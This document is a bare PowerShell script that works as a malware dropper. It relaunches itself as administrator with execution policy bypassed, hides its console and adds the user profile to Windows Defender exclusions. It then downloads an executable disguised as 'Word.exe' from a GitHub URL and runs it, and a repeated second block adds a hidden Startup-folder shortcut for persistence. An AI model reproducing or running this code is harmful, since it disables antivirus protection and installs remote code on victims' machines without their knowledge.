if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
    exit;
}
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
function Hide-Console
{
    $consolePtr = [Console.Window]::GetConsoleWindow()
    #0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
}
Hide-Console
Add-MpPreference -ExclusionPath $env:USERPROFILE
$url = 'https://github.com/MrRoyal1235/checkaccvjppro/raw/main/Word.exe'
$outputFile = [System.IO.Path]::Combine($env:Temp, 'Word.exe')
Start-Sleep -Milliseconds 100 
Invoke-WebRequest -Uri $url -OutFile $outputFile
Start-Process -FilePath $outputFile
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'

function Hide-Console {
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 0)  # Ẩn cửa sổ console
}

function Test-InternetConnection {
    try {
        # Ping Google DNS (8.8.8.8)
        $pingResult = Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet
        return $pingResult
    } catch {
        return $false
    }
}

function Wait-ForInternet {
    while (-not (Test-InternetConnection)) {
        Start-Sleep -Seconds 10 
    }
}

function Add-ToStartup {
    $scriptPath = $MyInvocation.MyCommand.Definition
    $startupFolder = [System.IO.Path]::Combine($env:AppData, "Microsoft\Windows\Start Menu\Programs\Startup")

    $WshShell = New-Object -ComObject WScript.Shell
    $shortcut = $WshShell.CreateShortcut("$startupFolder\RunMyScript.lnk")
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
    $shortcut.Save()
}

Hide-Console
Add-ToStartup

Add-MpPreference -ExclusionPath $env:USERPROFILE

$url = 'https://github.com/MrRoyal1235/checkaccvjppro/raw/main/Word.exe'
$outputFile = [System.IO.Path]::Combine($env:Temp, 'Word.exe')

Wait-ForInternet

Invoke-WebRequest -Uri $url -OutFile $outputFile

Start-Process -FilePath $outputFile
